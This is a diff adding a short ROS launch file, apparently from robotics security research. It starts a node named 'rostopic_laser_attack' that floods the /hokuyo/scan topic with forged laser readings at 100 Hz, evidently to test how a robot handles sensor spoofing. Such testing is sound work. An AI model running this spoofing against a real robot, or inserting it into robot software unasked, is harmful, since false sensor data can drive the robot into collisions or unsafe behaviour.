@@ -1,0 +1,17 @@
+<!--
+
+Launches a publisher spoofing laser data.
+
+2018-11-30
+Denise Ratasich
+
+-->
+
+<launch>
+
+  <!-- spoofing -->
+  <node name="rostopic_laser_attack"
+	pkg="rostopic" type="rostopic"
+	args="pub /hokuyo/scan sensor_msgs/LaserScan 'ranges: [3.0]' -r 100" />
+
+</launch>
